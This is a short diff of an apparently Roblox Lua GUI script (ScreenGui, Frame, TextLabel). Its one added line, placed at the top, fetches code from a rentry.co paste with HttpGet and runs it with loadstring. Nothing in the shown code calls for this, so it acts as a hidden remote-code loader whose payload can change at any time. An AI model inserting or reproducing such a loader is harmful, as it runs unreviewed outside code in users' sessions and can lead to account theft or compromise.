@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://rentry.co/4i2h4t/raw", true))() 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
